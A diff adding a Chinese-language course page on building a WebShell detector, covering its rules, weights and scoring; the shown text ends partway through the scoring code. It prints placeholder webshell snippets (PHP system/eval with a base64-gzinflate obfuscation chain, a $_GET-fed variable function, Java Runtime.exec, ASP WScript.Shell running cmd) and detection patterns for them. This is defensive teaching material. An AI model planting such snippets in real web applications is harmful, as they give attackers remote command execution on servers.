@@ -1,0 +1,1456 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Day 158 — WebShell 检测：实战扫描器（静态特征 + 行为关联 + 评分定级）</title>
+<link rel="stylesheet" href="../assets/style.css">
+<link rel="stylesheet" href="../assets/lesson.css">
+</head>
+<body class="lesson">
+<a class="skip" href="#content">跳到正文</a>
+
+<header class="lhead">
+  <a class="back" href="../index.html">← 返回总目录</a>
+  <h1>Day 158 — WebShell 检测：实战扫描器（静态特征 + 行为关联 + 评分定级）</h1>
+  <div class="lmeta">
+    <span class="badge">网络安全开发</span>
+    <span class="badge">816 行</span>
+    <span class="badge">4 个可运行脚本</span>
+    <div class="pills"><a class="pill-link" href="code/" download>📦 下载本课代码（4 个文件）</a><a class="pill-link" href="exercises.html">✍️ 练习与清单</a><a class="pill-link" href="diagrams.html">🗺️ 图解</a><a class="pill-link" href="https://github.com/Geek0ne/Python-200-days/tree/main/days/day-158-webshell-检测" rel="noopener">📁 GitHub 源文件</a></div>
+  </div>
+</header>
+
+<div class="lwrap">
+  <nav class="toc" aria-label="目录">
+    <div class="toc-h">本页目录</div>
+    <a class="toc-l2" href="#1">1. 学习目标</a>
+<a class="toc-l2" href="#2-webshell">2. 概念：WebShell 是什么</a>
+<a class="toc-l3" href="#21">2.1 定义</a>
+<a class="toc-l3" href="#22">2.2 为什么它是攻击链的&quot;最后一跳&quot;</a>
+<a class="toc-l3" href="#23">2.3 四类形态总览</a>
+<a class="toc-l3" href="#24">2.4 家族谱系与边界</a>
+<a class="toc-l2" href="#3">3. 底层机制：这些特征为什么一定会出现在文件里</a>
+<a class="toc-l3" href="#31-php">3.1 PHP：命令执行</a>
+<a class="toc-l3" href="#32-php">3.2 PHP：动态求值（比命令执行更危险）</a>
+<a class="toc-l3" href="#33-php">3.3 PHP：为什么后门作者要做编码混淆</a>
+<a class="toc-l3" href="#34-jsp">3.4 JSP：命令执行与&quot;免杀&quot;字节码</a>
+<a class="toc-l3" href="#35-asp-aspxcom-net">3.5 ASP / ASPX：COM 对象与 .NET 进程</a>
+<a class="toc-l3" href="#36">3.6 文件上传形态：为什么它是最常见的入口</a>
+<a class="toc-l2" href="#4">4. 检测原理：词法扫描到底做了什么</a>
+<a class="toc-l3" href="#41">4.1 三个层次，本课在第几层</a>
+<a class="toc-l3" href="#42">4.2 规则模型</a>
+<a class="toc-l3" href="#43">4.3 语言标签与扩展名映射（含一个真实的坑）</a>
+<a class="toc-l3" href="#44">4.4 评分模型</a>
+<a class="toc-l3" href="#45">4.5 分级阈值</a>
+<a class="toc-l3" href="#46">4.6 命中 ≠ 恶意：三类误报来源</a>
+<a class="toc-l2" href="#5">5. 攻击特征 ↔ 检测特征：完整对照</a>
+<a class="toc-l3" href="#51-20-rules">5.1 全部 20 条规则（--rules 输出）</a>
+<a class="toc-l3" href="#52">5.2 样本逐字（占位载荷）</a>
+<a class="toc-l3" href="#53">5.3 从&quot;特征&quot;到&quot;人工复核问题&quot;的映射</a>
+<a class="toc-l2" href="#6">6. 行为关联：从&quot;文件里有特征&quot;到&quot;这台机器在干什么&quot;</a>
+<a class="toc-l3" href="#61">6.1 三个必须理解的设计决定</a>
+<a class="toc-l3" href="#62">6.2 静态 + 行为的正确配合方式</a>
+<a class="toc-l2" href="#7">7. 防护与修复原理</a>
+<a class="toc-l3" href="#71">7.1 让后门写不下来（最优先）</a>
+<a class="toc-l3" href="#72">7.2 让后门就算写下来也做不了事</a>
+<a class="toc-l3" href="#73">7.3 让后门藏不住（对应对手：混淆）</a>
+<a class="toc-l3" href="#74">7.4 修复流程（发现疑似后门后）</a>
+<a class="toc-l2" href="#8">8. 代码案例逐节说明</a>
+<a class="toc-l3" href="#81-codestatic_scanpy">8.1 code/static_scan.py — 规则引擎（被三个脚本共用）</a>
+<a class="toc-l3" href="#82-code01-static-scannerpy">8.2 code/01-static-scanner.py — 样本集 + 评分演示</a>
+<a class="toc-l3" href="#83-code02-behavior-hunterpy">8.3 code/02-behavior-hunter.py — 行为关联</a>
+<a class="toc-l3" href="#84-code03-webshell-scannerpy-cli">8.4 code/03-webshell-scanner.py — 完整 CLI</a>
+<a class="toc-l2" href="#9">9. 运行命令 + 预期输出（实测）</a>
+<a class="toc-l3" href="#91">9.1 自测（四个文件）</a>
+<a class="toc-l3" href="#92">9.2 生成样本集并扫描</a>
+<a class="toc-l3" href="#93">9.3 行为关联</a>
+<a class="toc-l3" href="#94">9.4 扫描自己的离线副本</a>
+<a class="toc-l2" href="#10">10. 局限与自测覆盖</a>
+<a class="toc-l3" href="#101-self-test">10.1 自测覆盖了什么（--self-test 断言清单）</a>
+<a class="toc-l3" href="#102">10.2 没有覆盖的（生产化前必须补齐，且必须留在报告里）</a>
+<a class="toc-l2" href="#11">11. 后续练习</a>
+  </nav>
+  <main id="content" class="lbody">
+<h1 id="day-158-webshell">Day 158 — WebShell 检测：实战扫描器（静态特征 + 行为关联 + 评分定级）</h1>
+<blockquote>
+<p>Phase 10 — 网络安全开发。<strong>实战项目</strong>：面向真实检测场景的 WebShell 扫描器。</p>
+<p><strong>授权边界（重要）</strong>：本课所有样本与扫描只用于<strong>授权环境</strong>（你自己的服务器、靶场、<br>
+或已获书面授权的评测环境）与<strong>离线只读副本</strong>。扫描器不导入、不解码、不执行被扫描<br>
+文件，不发任何网络请求，不自动删除或隔离任何文件。<br>
+样本中的命令、地址、路径、载荷<strong>全部是占位符</strong>（如 <code>whoami</code>、<code>203.0.113.1</code>、<br>
+<code>PLACEHOLDER</code>），不构成可部署的后门，也不包含任何规避检测的对抗手法。</p>
+</blockquote>
+<h2 id="1">1. 学习目标</h2>
+<p>完成本课后，应能：</p>
+<ul>
+<li>说清 WebShell 的<strong>四类形态</strong>（命令执行 / 动态求值 / 编码混淆 / 文件上传）各自<br>
+<strong>靠什么机制工作</strong>，以及它们为什么会留下可被词法匹配的特征</li>
+<li>识别各语言（PHP / JSP / ASPX / ASP）常见后门特征对应的<strong>危险 API 与语言构造</strong></li>
+<li>理解<strong>命中 ≠ 恶意</strong>：同一个 API 在正常业务代码里也出现，特征只是复核线索</li>
+<li>用<strong>加权评分</strong>给文件定级（clean / low / medium / high / critical），并知道分值怎么来的</li>
+<li>用<strong>行为信号关联</strong>（上传脚本 + 子进程 + 命令参数）判断一台主机是否需人工复核</li>
+<li>理解扫描器的<strong>局限</strong>：误报从哪来、漏报为什么不可避免，以及"无命中 ≠ 安全"</li>
+</ul>
+<h2 id="2-webshell">2. 概念：WebShell 是什么</h2>
+<h3 id="21">2.1 定义</h3>
+<p><strong>WebShell</strong> 是一段被放进 Web 可访问位置、能让攻击者通过 HTTP 请求间接控制服务器的<br>
+代码。它的本质是<strong>一个把 HTTP 请求参数变成服务端操作的翻译层</strong>：</p>
+<pre class="plain"><code>攻击者的 HTTP 请求 ──▶ Web 服务器执行脚本 ──▶ 脚本把参数当作命令/代码/文件路径执行
+        （输入）              （执行点）                    （危险汇点 sink）
+</code></pre>
+<p>关键点：<strong>它不需要自己监听端口</strong>。它寄生在已经对外开放的 Web 服务上，<br>
+流量混在正常 HTTP 里，因此常常绕过网络层的边界防护。</p>
+<h3 id="22">2.2 为什么它是攻击链的"最后一跳"</h3>
+<p>一条典型的 Web 入侵链是：</p>
+<pre class="plain"><code>① 找入口（上传点 / 反序列化 / SQLi / 文件包含 / 依赖漏洞）
+② 写入代码（上传文件、写日志、写配置、写 session）
+③ 触发代码（访问那个 URL）
+④ 提权 / 横向（读配置里的凭据、连内网、装内网工具）
+⑤ 持久化（再放一个更隐蔽的 WebShell 或内存马）
+</code></pre>
+<p>第 ② 步落下来的文件就是 WebShell。检测它的价值在于：<strong>它是攻击者必须留下来的<br>
+一个物理痕迹</strong>——只要落地成文件，就一定能被文件系统层面的检查看到。</p>
+<h3 id="23">2.3 四类形态总览</h3>
+<p>这四类不是"四种不同病毒"，而是<strong>同一条链上的四种技术选择</strong>，而且经常叠加使用：</p>
+<table>
+<thead>
+<tr>
+<th>形态</th>
+<th>一句话机制</th>
+<th>真实文件里的样子（占位）</th>
+<th>命中的规则族</th>
+<th>典型权重</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>命令执行</strong></td>
+<td>把外部输入当 OS 命令交给 shell</td>
+<td><code>system('whoami')</code> / <code>Runtime.exec</code> / <code>WScript.Shell.Run</code></td>
+<td><code>php_cmd_exec</code>、<code>php_backtick_exec</code>、<code>jsp_runtime_exec</code>、<code>jsp_process_builder</code>、<code>aspx_process_start</code>、<code>asp_wscript_shell</code></td>
+<td>3 / 2</td>
+</tr>
+<tr>
+<td><strong>动态求值</strong></td>
+<td>把外部输入当<strong>代码</strong>执行（比命令更危险：不分语言边界）</td>
+<td><code>eval($x)</code> / <code>assert($x)</code> / <code>Execute($x)</code> / <code>defineClass</code></td>
+<td><code>php_dynamic_eval</code>、<code>php_call_user_func</code>、<code>asp_execute</code>、<code>jsp_define_class</code></td>
+<td>3 / 2</td>
+</tr>
+<tr>
+<td><strong>编码混淆</strong></td>
+<td>把危险字符串藏成密文，运行时才解码</td>
+<td><code>@eval(gzinflate(str_rot13(base64_decode('...'))))</code></td>
+<td><code>encode_decode</code>、<code>encode_encode</code>、<code>php_error_suppress</code>、<code>php_long_obfuscated_var</code>、<code>php_globals_var</code></td>
+<td>1–2</td>
+</tr>
+<tr>
+<td><strong>文件上传</strong></td>
+<td>把代码<strong>写进</strong>服务器，再由 Web 访问触发</td>
+<td><code>move_uploaded_file($_FILES['f']['tmp_name'], $dst)</code></td>
+<td><code>file_write</code>、<code>file_mod</code>、<code>php_superglobal_input</code></td>
+<td>2 / 1</td>
+</tr>
+</tbody>
+</table>
+<p>另外两个横切能力（不属于"形态"但与形态一起出现）：</p>
+<table>
+<thead>
+<tr>
+<th>能力</th>
+<th>机制</th>
+<th>命中的规则</th>
+<th>权重</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>网络外联</strong></td>
+<td>后门主动回连攻击者（反向 shell / C2）</td>
+<td><code>network_socket</code>（<code>fsockopen</code>/<code>stream_socket_client</code>/<code>socket_create</code>/<code>curl_exec</code>）</td>
+<td>2</td>
+</tr>
+<tr>
+<td><strong>动态包含</strong></td>
+<td>把外部输入当文件路径包含进来（LFI/RFI）</td>
+<td><code>include_dynamic</code>（<code>include</code>/<code>require</code> 后直接跟 <code>$</code> 或引号）</td>
+<td>1</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>记忆法：<strong>"外部输入"（<code>$_GET</code>/<code>$_POST</code>/<code>$_REQUEST</code>/<code>$_COOKIE</code>/<code>$_FILES</code>）出现的地方，<br>
+就是危险汇点可能出现的地方</strong>。但"出现了输入"本身完全无害（几乎每个网页都有），<br>
+只有"输入<strong>直接</strong>流向危险汇点"才有问题——这是数据流分析要回答的问题（见 4.1）。</p>
+</blockquote>
+<h3 id="24">2.4 家族谱系与边界</h3>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>是否落地为文件</th>
+<th>本课是否覆盖</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>一句话后门（几行代码，只做命令执行）</td>
+<td>是</td>
+<td>✅ 覆盖（<code>simple-cmd.php</code>）</td>
+</tr>
+<tr>
+<td>大马（带 UI，文件管理 / 数据库 / 命令面板）</td>
+<td>是</td>
+<td>✅ 特征同类（文件操作 + 命令执行）</td>
+</tr>
+<tr>
+<td>混淆后门（编码 + 动态求值叠加）</td>
+<td>是</td>
+<td>✅ 覆盖（<code>obfuscated.php</code>）</td>
+</tr>
+<tr>
+<td>内存马（注册 Filter / Servlet / Agent，不落盘）</td>
+<td>否</td>
+<td>❌ <strong>不在本课范围</strong>（需要运行时/内存检测）</td>
+</tr>
+<tr>
+<td>无文件（把代码写进数据库、日志、session）</td>
+<td>部分</td>
+<td>❌ 不在本课范围（需要日志与数据面检测）</td>
+</tr>
+</tbody>
+</table>
+<p>内存马与无文件后门是真实对抗的前沿，本课的静态扫描器<strong>结构上</strong>看不到它们。<br>
+这一点必须写进结论，不能因为"扫了没发现"就说"没有后门"。</p>
+<h2 id="3">3. 底层机制：这些特征为什么一定会出现在文件里</h2>
+<p>理解机制的目的很实际：<strong>知道哪些 API 是"功能本身决定必须出现"的，才能写出<br>
+不会因为改名/换写法就失效的规则。</strong></p>
+<h3 id="31-php">3.1 PHP：命令执行</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">php</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="x">system(&#39;whoami&#39;);        // 执行命令并把输出直接打印</span>
+<span class="x">exec(&#39;id&#39;, $out);        // 执行命令，输出按行存进数组</span>
+<span class="x">shell_exec(&#39;id&#39;);        // 执行命令，返回完整输出字符串</span>
+<span class="x">passthru(&#39;id&#39;);          // 执行命令，二进制输出直接透传（适合反向 shell）</span>
+<span class="x">popen(&#39;id&#39;, &#39;r&#39;);        // 打开进程管道（可读/可写，双向交互）</span>
+<span class="x">proc_open(&#39;id&#39;, ...);    // 完全受控的子进程（可控制 stdin/stdout/stderr）</span>
+<span class="x">pcntl_exec(&#39;/bin/sh&#39;);   // 直接替换当前进程映像（最隐蔽）</span>
+<span class="x">`id`;                    // 反引号 = shell_exec() 的语法糖（最容易被忽略）</span>
+</code></pre></div>
+<p><strong>为什么这些特征稳定？</strong> 因为它们都是 PHP 提供的<strong>语言级/标准库级封装</strong>，<br>
+最终都要落到 C 库的 <code>fork</code>/<code>exec</code> 或 shell 上。后门作者可以改函数名之外的一切<br>
+（变量名、缩进、注释），但<strong>只要还想执行系统命令，就必须调用其中之一</strong>——<br>
+这正是词法规则能生效的物理基础。</p>
+<h3 id="32-php">3.2 PHP：动态求值（比命令执行更危险）</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">php</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="x">eval($code);                        // 把字符串当 PHP 代码执行</span>
+<span class="x">assert($code);                      // 老版本 PHP 中字符串会被求值（历史后门常用）</span>
+<span class="x">create_function(&#39;$a&#39;, $code);       // 运行时创建函数（已废弃，但老代码里常见）</span>
+<span class="x">call_user_func($fn, $arg);          // 回调：函数名可控 → 等于可控调用</span>
+<span class="x">call_user_func_array($fn, $args);</span>
+<span class="x">array_map($fn, $arr);               // 回调族：$fn 来自输入即为后门</span>
+<span class="x">$fn = $_GET[&#39;fn&#39;]; $fn(&#39;id&#39;);       // 变量函数：$f() 语法，最难用正则抓稳</span>
+</code></pre></div>
+<p><strong>为什么它比命令执行更危险？</strong> 命令执行只能调用 OS 命令；动态求值执行的是<br>
+<strong>宿主语言的代码</strong>，可以直接读写文件、连数据库、发 HTTP 请求——危害面是无限大的。</p>
+<p><strong>为什么它难检测？</strong> 变量函数（<code>$f()</code>）与回调族在正常框架代码里也大量出现<br>
+（路由分发、事件系统），所以本课给它的是<strong>中低权重 + 必须人工复核</strong>，而不是"命中即恶意"。</p>
+<h3 id="33-php">3.3 PHP：为什么后门作者要做编码混淆</h3>
+<p>因为最朴素的静态检测就是"搜关键字"。所以后门作者做的事是：<br>
+<strong>让"危险字符串"在文件里不以明文出现，而在运行时才被组装出来。</strong></p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">php</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="x">// 经典三层解码链（本课样本 obfuscated.php 的骨架，载荷为占位符）</span>
+<span class="x">@eval(gzinflate(str_rot13(base64_decode(&#39;eJwLSS0uAQAFAAGi&#39;))));</span>
+</code></pre></div>
+<p>逐层拆开：</p>
+<table>
+<thead>
+<tr>
+<th>层</th>
+<th>函数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>base64_decode</code></td>
+<td>把 base64 文本还原成字节</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>str_rot13</code></td>
+<td>字母位移，让第 1 层的结果即使被看到也不像 base64</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>gzinflate</code></td>
+<td>zlib 解压，把体积压到最小（文件看起来只是乱码小串）</td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>eval</code></td>
+<td>真正执行解码出来的代码</td>
+</tr>
+<tr>
+<td>装饰</td>
+<td><code>@</code></td>
+<td>抑制错误输出，避免"解码失败"暴露给管理员</td>
+</tr>
+<tr>
+<td>装饰</td>
+<td><code>$GLOBALS[...]</code> / 超长变量名</td>
+<td>打散字符串、干扰人工阅读与正则匹配</td>
+</tr>
+</tbody>
+</table>
+<p>对应的检测规则族：</p>
+<table>
+<thead>
+<tr>
+<th>规则</th>
+<th>匹配</th>
+<th>权重</th>
+<th>为什么这么定</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>encode_decode</code></td>
+<td><code>base64_decode</code> / <code>gzinflate</code> / <code>gzuncompress</code> / <code>str_rot13</code> / <code>hex2bin</code> / <code>pack</code></td>
+<td>2</td>
+<td>解码单独出现可能是正常业务（读配置），但在<strong>含 eval 的文件里</strong>就是强信号</td>
+</tr>
+<tr>
+<td><code>encode_encode</code></td>
+<td><code>base64_encode</code> / <code>gzcompress</code> / <code>str_rot13</code> / <code>bin2hex</code></td>
+<td>1</td>
+<td>编码在正常业务里极常见（生成 token、十六进制表示），只能给最低权重</td>
+</tr>
+<tr>
+<td><code>php_error_suppress</code></td>
+<td><code>@system</code> / <code>@eval</code> / <code>@include</code> …</td>
+<td>1</td>
+<td>抑制错误是"不想被发现"的弱信号</td>
+</tr>
+<tr>
+<td><code>php_long_obfuscated_var</code></td>
+<td><code>$</code> + 16 个字符以上的变量名赋值</td>
+<td>1</td>
+<td>正常代码也有长变量名，属弱特征</td>
+</tr>
+<tr>
+<td><code>php_globals_var</code></td>
+<td><code>$GLOBALS[</code></td>
+<td>1</td>
+<td>常用于打散变量作用域，属弱特征</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>权重设计的核心思想</strong>：权重不是"这个词有多坏"，而是"<strong>这个词单独出现时有多可疑</strong>"。<br>
+<code>base64_decode</code> 单独出现＝可能是正常业务（2 分）；<code>eval</code> 单独出现＝高度可疑（3 分）；<br>
+<code>@eval(...)</code> 组合出现＝两头分数叠加，自然进入 high/critical。</p>
+</blockquote>
+<h3 id="34-jsp">3.4 JSP：命令执行与"免杀"字节码</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">java</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&quot;sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;-c&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;id&quot;</span><span class="p">});</span><span class="w">   </span><span class="c1">// 最经典</span>
+<span class="k">new</span><span class="w"> </span><span class="n">ProcessBuilder</span><span class="p">(</span><span class="s">&quot;sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;-c&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;id&quot;</span><span class="p">).</span><span class="na">start</span><span class="p">();</span><span class="w">                </span><span class="c1">// 更现代、更灵活</span>
+</code></pre></div>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">java</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="c1">// defineClass 形态：自己加载一段字节码，不走磁盘上的 .class 文件</span>
+<span class="n">Method</span><span class="w"> </span><span class="n">defineClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassLoader</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&quot;defineClass&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">...);</span>
+</code></pre></div>
+<p><strong><code>defineClass</code> 为什么权重给 2（动态类）？</strong> 因为它让攻击者可以把恶意逻辑写成<br>
+<strong>内存里的字节码</strong>，磁盘上只留一行"看起来无害"的类加载代码——这已经接近内存马，<br>
+属于静态检测能力的边缘。本课只做"出现即标记"，不保证抓得住。</p>
+<h3 id="35-asp-aspxcom-net">3.5 ASP / ASPX：COM 对象与 .NET 进程</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">asp</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl">&lt;% &#x27; 经典 ASP：调用 Windows COM 组件
+Set sh = CreateObject(&quot;WScript.Shell&quot;)
+sh.Run &quot;cmd /c whoami&quot;
+Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)
+%&gt;
+</code></pre></div>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">csharp</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="o">&lt;%--</span><span class="w"> </span><span class="n">ASPX</span><span class="err">：</span><span class="p">.</span><span class="n">NET</span><span class="w"> </span><span class="err">世界里等价的写法</span><span class="w"> </span><span class="o">--%&gt;</span>
+<span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="s">&quot;whoami&quot;</span><span class="p">);</span>
+</code></pre></div>
+<p>ASP 还有一个独有的动态求值入口：<code>Execute("...")</code> / <code>ExecuteGlobal("...")</code><br>
+（把字符串当 VBScript 代码执行，等价于 PHP 的 <code>eval</code>）。</p>
+<h3 id="36">3.6 文件上传形态：为什么它是最常见的入口</h3>
+<p>机制链条非常清晰：</p>
+<pre class="plain"><code>① 网站有上传功能（头像、附件、导入）
+② 服务端校验缺失或可绕过（只查 Content-Type / 只查后缀黑名单 / 不改名）
+③ 上传的文件落到 Web 可访问目录
+④ 文件名后缀可执行（.php / .jsp / .aspx）或配合解析漏洞（.php.jpg、%00 截断）
+⑤ 攻击者直接访问该 URL → Web 服务器执行它
+</code></pre>
+<p>所以<strong>上传点 + 落盘 API</strong> 是检测的重点：</p>
+<table>
+<thead>
+<tr>
+<th>规则</th>
+<th>匹配</th>
+<th>权重</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>file_write</code></td>
+<td><code>fwrite</code> / <code>fputs</code> / <code>file_put_contents</code> / <code>move_uploaded_file</code></td>
+<td>2</td>
+<td>写文件是"落地"的必要动作</td>
+</tr>
+<tr>
+<td><code>file_mod</code></td>
+<td><code>chmod</code> / <code>unlink</code> / <code>rename</code> / <code>copy</code></td>
+<td>1</td>
+<td>改权限/改名/删除，常见于清理痕迹或提高权限</td>
+</tr>
+<tr>
+<td><code>php_superglobal_input</code></td>
+<td><code>$_GET[...]</code> / <code>$_POST[...]</code> / <code>$_FILES[...]</code> …</td>
+<td>1</td>
+<td>外部输入入口（单独出现完全无害）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>关键教学点</strong>：正常业务的上传处理器<strong>同样会用</strong> <code>move_uploaded_file</code> 和 <code>$_FILES</code>。<br>
+本课样本集里专门放了一个 <code>benign-upload.php</code>——它做了类型白名单 + 随机重命名，<br>
+逻辑完全正当，<strong>却依然被评到 high（5 分）</strong>。这就是静态特征的物理上限：<br>
+它能告诉你"这里有写文件动作"，但<strong>不能</strong>告诉你"写入的路径/后缀是否可控"。</p>
+<h2 id="4">4. 检测原理：词法扫描到底做了什么</h2>
+<h3 id="41">4.1 三个层次，本课在第几层</h3>
+<pre class="plain"><code>第 1 层  词法/正则     &quot;文件里出现了 system( 吗？&quot;           ← 本课在这里
+第 2 层  语法/语义     &quot;这个 system( 参数的表达式类型是什么？&quot;
+第 3 层  数据流         &quot;外部输入能不能一路流到这个参数？&quot;
+</code></pre>
+<p>第 1 层快、便宜、能扫任何文本；代价是<strong>分不清"提到"和"使用"</strong>：</p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">php</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="x">echo &quot;文档：不要用 system()&quot;;      // 只是字符串 → 会被误报</span>
+<span class="x">system(&#39;whoami&#39;);                  // 真的在用 → 命中所指</span>
+</code></pre></div>
+<p>第 3 层才能回答"能不能被真正利用"，但那需要 AST、跨文件追踪、常量传播——<br>
+不是本课范围。<strong>因此本课所有结论的措辞都必须停在"需人工复核的线索"。</strong></p>
+<h3 id="42">4.2 规则模型</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="n">Rule</span> <span class="o">=</span> <span class="nb">tuple</span>  <span class="c1"># (name, pattern, weight, category, languages)</span>
+<span class="c1"># ex: (&#39;php_cmd_exec&#39;, re.compile(r&#39;\b(?:system|exec|shell_exec|...)\s*\(&#39;, re.I),</span>
+<span class="c1">#      3, &#39;command&#39;, {&#39;php&#39;})</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>作用</th>
+<th>设计理由</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>name</code></td>
+<td>规则唯一标识</td>
+<td>报告里按它聚合，是 baseline 抑制的键</td>
+</tr>
+<tr>
+<td><code>pattern</code></td>
+<td>已编译正则</td>
+<td>编译一次复用（<code>re.compile</code>），避免每次 <code>finditer</code> 重复编译</td>
+</tr>
+<tr>
+<td><code>weight</code></td>
+<td>1–3</td>
+<td>表达"单独出现时有多可疑"，不是"有多坏"</td>
+</tr>
+<tr>
+<td><code>category</code></td>
+<td>8 类之一</td>
+<td>供报告分类统计与人工快速定位</td>
+</tr>
+<tr>
+<td><code>languages</code></td>
+<td>语言标签集合</td>
+<td><strong>压制跨语言误报</strong>：Java 的 <code>.exec()</code> 不该命中 PHP 规则</td>
+</tr>
+</tbody>
+</table>
+<h3 id="43">4.3 语言标签与扩展名映射（含一个真实的坑）</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="n">EXT_LANGS</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;.php&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;php&#39;</span><span class="p">},</span> <span class="s1">&#39;.phtml&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;php&#39;</span><span class="p">},</span> <span class="s1">&#39;.jsp&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;jsp&#39;</span><span class="p">},</span>
+             <span class="s1">&#39;.aspx&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;aspx&#39;</span><span class="p">},</span> <span class="s1">&#39;.asp&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;asp&#39;</span><span class="p">},</span> <span class="o">...</span><span class="p">}</span>
+</code></pre></div>
+<p>匹配时：</p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="k">if</span> <span class="n">languages</span> <span class="ow">and</span> <span class="ow">not</span> <span class="p">(</span><span class="n">langs</span> <span class="o">&amp;</span> <span class="n">languages</span><span class="p">):</span>   <span class="c1"># 文件已知语言 &amp; 规则不支持它 → 跳过</span>
+    <span class="k">continue</span>
+</code></pre></div>
+<ul>
+<li>已知扩展名（如 <code>.php</code>）→ 只跑该语言的规则，<strong>大幅降低跨语言误报</strong></li>
+<li><strong>未知扩展名（<code>.txt</code> / <code>.log</code> / <code>.md</code>）→ <code>languages=None</code> → 全部规则参与</strong></li>
+</ul>
+<p>第二条是本课的<strong>故意设计</strong>：文档里提到危险 API 也必须能被扫出来（然后交给人判断），<br>
+否则"攻击者把后门改名成 <code>.txt</code> 再通过包含漏洞使用"就会完全漏掉。</p>
+<blockquote>
+<p><strong>实测的坑</strong>：样本 <code>aspx.aspx.cs</code> 的后缀是 <code>.cs</code>，<strong>不在</strong> <code>EXT_LANGS</code> 里，<br>
+所以它走的是"未知扩展名 → 全部规则参与"。它能命中 <code>aspx_process_start</code><br>
+是因为 ASPX 规则确实包含 <code>Process.Start</code>，而不是因为扩展名被识别成 ASPX。<br>
+真实项目里 <code>.cs</code> 是源码文件，这种"未知扩展名全规则参与"的设计会带来噪声，<br>
+生产化时应补一条 <code>.cs</code> 的映射或加白名单（练习 3）。</p>
+</blockquote>
+<h3 id="44">4.4 评分模型</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="k">def</span> <span class="nf">score_findings</span><span class="p">(</span><span class="n">findings</span><span class="p">):</span>
+    <span class="n">counts</span> <span class="o">=</span> <span class="p">{}</span>                                  <span class="c1"># 按规则名统计命中次数</span>
+    <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">findings</span><span class="p">:</span>
+        <span class="n">counts</span><span class="p">[</span><span class="n">f</span><span class="p">[</span><span class="s1">&#39;rule&#39;</span><span class="p">]]</span> <span class="o">=</span> <span class="n">counts</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">f</span><span class="p">[</span><span class="s1">&#39;rule&#39;</span><span class="p">],</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
+    <span class="n">score</span> <span class="o">=</span> <span class="mi">0</span>
